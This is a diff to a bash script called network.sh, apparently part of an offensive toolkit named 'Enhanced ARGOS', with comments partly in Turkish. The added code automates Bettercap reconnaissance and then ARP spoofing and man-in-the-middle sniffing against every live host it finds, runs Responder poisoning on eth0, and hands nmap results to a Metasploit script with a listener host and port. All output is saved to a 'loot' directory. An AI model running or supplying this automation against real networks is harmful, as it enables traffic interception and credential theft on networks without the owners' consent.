@@ -1,10 +1,11 @@
+# network.sh
 #!/usr/bin/env bash
 ###############################################################################
 # Enhanced ARGOS - Network Analysis
 # Gelişmiş ağ tarama ve otomasyon betiği
 ###############################################################################
 
-source ../utils.sh
+source "$(dirname "$0")/../utils.sh"
 
 RED="\033[0;31m"
 GREEN="\033[0;32m"
@@ -12,11 +13,13 @@ CYAN="\033[0;36m"
 RESET="\033[0m"
 
 cat << "EOF"
-           _______ 
-   _   _ \___    _|
-  |  \| |/ _ \ |
-  | |\  |  __/ |  
-  |_| \_|\___|_|
+  ███╗   ███╗     ███╗     ███╗    ████╗ 
+ █████╗ ██████╗  ██████╗  ██████╗ ███████╗
+██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗██╔════╝
+███████║██████╔╝██║  ███╗██║   ██║███████╗
+██╔══██║██╔══██╗██║   ██║██║   ██║╚════██║
+██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
                 NETWORK ANALYSIS
 EOF
 
@@ -73,11 +76,55 @@ fi
 
 # Bettercap
 if command -v bettercap >/dev/null; then
-  echo -ne "${CYAN}[?] Run Bettercap for MITM/ARP spoofing? (y/N): ${RESET}"
+  echo -ne "${CYAN}[?] Run Bettercap for MITM/ARP spoofing and analysis? (y/N): ${RESET}"
   read -r RUN_BC
   if [[ "$RUN_BC" =~ ^[Yy]$ ]]; then
-    sudo bettercap -eval "set arp.spoof.targets $RANGE; set arp.spoof.internal true; arp.spoof on; net.sniff on;" \
-      | tee "$LOOT_DIR/bettercap_${TS}.log"
+    echo -ne "${CYAN}[*] Enter duration for ARP spoofing in seconds [default=30]: ${RESET}"
+    read -r DURATION
+    DURATION=${DURATION:-30}
+
+    echo -e "${GREEN}[+] Initializing Bettercap...${RESET}"
+
+    # Net Recon and Probing
+    echo -e "${CYAN}[*] Starting network reconnaissance and packet analysis...${RESET}"
+    sudo bettercap -eval "
+      net.recon on;
+      net.probe on;
+      net.sniff on;
+      sleep 15;  # Capture packets for 15 seconds
+      net.sniff off;
+    " | tee "$LOOT_DIR/bettercap_recon_${TS}.log"
+
+    echo -e "${CYAN}[*] Packet analysis phase completed. Results saved to $LOOT_DIR/bettercap_recon_${TS}.log.${RESET}"
+
+    # Validate if live targets are identified
+    LIVE_TARGETS=$(grep "Found" "$LOOT_DIR/bettercap_recon_${TS}.log" | awk '{print $NF}' | tr '\n' ',')
+    if [ -z "$LIVE_TARGETS" ]; then
+      echo -e "${RED}[!] No live targets identified during reconnaissance.${RESET}"
+      exit 1
+    fi
+    echo -e "${GREEN}[+] Identified live targets: $LIVE_TARGETS${RESET}"
+
+    # ARP Spoofing and MITM
+    echo -e "${CYAN}[*] Starting ARP spoofing and MITM attack on targets: $LIVE_TARGETS for $DURATION seconds.${RESET}"
+    sudo bettercap -eval "
+      set arp.spoof.targets $LIVE_TARGETS;
+      set arp.spoof.internal true;
+      arp.spoof on;
+      net.sniff on;
+      sleep $DURATION;  # Spoof and capture packets for the user-defined duration
+      arp.spoof off;
+      net.sniff off;
+    " | tee "$LOOT_DIR/bettercap_arp_${TS}.log"
+
+    echo -e "${GREEN}[+] ARP spoofing and MITM attack completed. Results saved to $LOOT_DIR/bettercap_arp_${TS}.log.${RESET}"
+
+    # Error Analysis
+    if grep -q "error" "$LOOT_DIR/bettercap_arp_${TS}.log"; then
+      echo -e "${RED}[!] Errors detected during Bettercap execution. Check the log file for details.${RESET}"
+    else
+      echo -e "${GREEN}[+] No errors detected during Bettercap execution.${RESET}"
+    fi
   fi
 fi
 
@@ -86,9 +133,51 @@ if command -v responder >/dev/null; then
   echo -ne "${CYAN}[?] Run Responder for SMB/NetBIOS analysis? (y/N): ${RESET}"
   read -r RUN_RESP
   if [[ "$RUN_RESP" =~ ^[Yy]$ ]]; then
-    sudo responder -I eth0 -w -d | tee "$LOOT_DIR/responder_${TS}.log"
+    RESP_LOG="$LOOT_DIR/responder_${TS}.log"
+    sudo responder -I eth0 -w -d | tee "$RESP_LOG"
+    if grep -q "Error" "$RESP_LOG"; then
+      echo -e "${RED}[!] Responder encountered errors. Check $RESP_LOG for details.${RESET}"
+    else
+      echo -e "${GREEN}[+] Responder completed successfully. Results saved to $RESP_LOG.${RESET}"
+    fi
   fi
 fi
+
+###############################################################################
+# EKLEME BAŞLANGICI: Metasploit Entegrasyonu
+###############################################################################
+
+# Metasploit Automation
+if command -v bash >/dev/null && [ -f "$(dirname "$0")/metasploit.sh" ]; then
+  echo -e "${GREEN}[+] Starting Metasploit automation...${RESET}"
+  
+  # Nmap XML dosyasını belirleme (Tüm portlar taraması)
+  NMAP_XML="$LOOT_DIR/${SCAN}.xml"
+
+  if [ -f "$NMAP_XML" ]; then
+    # Kullanıcıdan LHOST ve LPORT bilgilerini almak (opsiyonel)
+    echo -ne "${CYAN}Enter LHOST for Metasploit (default=$(hostname -I | awk '{print $1}')): ${RESET}"
+    read -r M_LHOST
+    M_LHOST=${M_LHOST:-$(hostname -I | awk '{print $1}')}
+    
+    echo -ne "${CYAN}Enter LPORT for Metasploit (default=4444): ${RESET}"
+    read -r M_LPORT
+    M_LPORT=${M_LPORT:-4444}
+
+    # Metasploit betiğini çalıştırma
+    bash "$(dirname "$0")/metasploit.sh" --xml "$NMAP_XML" --lhost "$M_LHOST" --lport "$M_LPORT" --loot "$LOOT_DIR"
+
+    echo -e "${GREEN}[+] Metasploit automation completed.${RESET}"
+  else
+    echo -e "${RED}[!] Nmap XML output not found at $NMAP_XML. Skipping Metasploit automation.${RESET}"
+  fi
+else
+  echo -e "${RED}[!] metasploit.sh not found or bash not available. Skipping Metasploit automation.${RESET}"
+fi
+
+###############################################################################
+# EKLEME SONU
+###############################################################################
 
 echo -e "${GREEN}[NETWORK] Done. Results in $LOOT_DIR${RESET}"
 exit 0
